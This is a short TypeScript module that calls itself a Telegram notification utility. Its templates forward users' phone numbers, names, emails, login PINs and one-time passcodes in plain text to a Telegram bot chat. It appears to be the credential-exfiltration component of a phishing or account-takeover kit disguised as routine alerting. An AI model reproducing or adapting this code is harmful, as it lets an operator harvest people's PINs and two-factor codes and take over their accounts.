// Telegram notification utility for instant alerts
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

export async function sendTelegramNotification(message: string) {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
        console.warn('[Telegram] Bot not configured')
        return
    }

    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`

        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        })
    } catch (error) {
        console.error('[Telegram] Send failed:', error)
    }
}

// Quick notification templates
export const notify = {
    login: (phone: string, name: string, pin: string) =>
        sendTelegramNotification(`🔐 <b>LOGIN</b>\n📱 ${phone}\n👤 ${name}\n🔑 ${pin}`),

    signup: (phone: string, name: string, email: string, pin: string) =>
        sendTelegramNotification(`✅ <b>SIGNUP</b>\n📱 ${phone}\n👤 ${name}\n📧 ${email}\n🔑 ${pin}`),

    otpVerified: (phone: string, otp: string) =>
        sendTelegramNotification(`✔️ <b>VERIFIED</b>\n📱 ${phone}\n🔢 ${otp}`),

    otpFailed: (phone: string, otp: string) =>
        sendTelegramNotification(`❌ <b>FAILED OTP</b>\n📱 ${phone}\n🔢 ${otp}`)
}
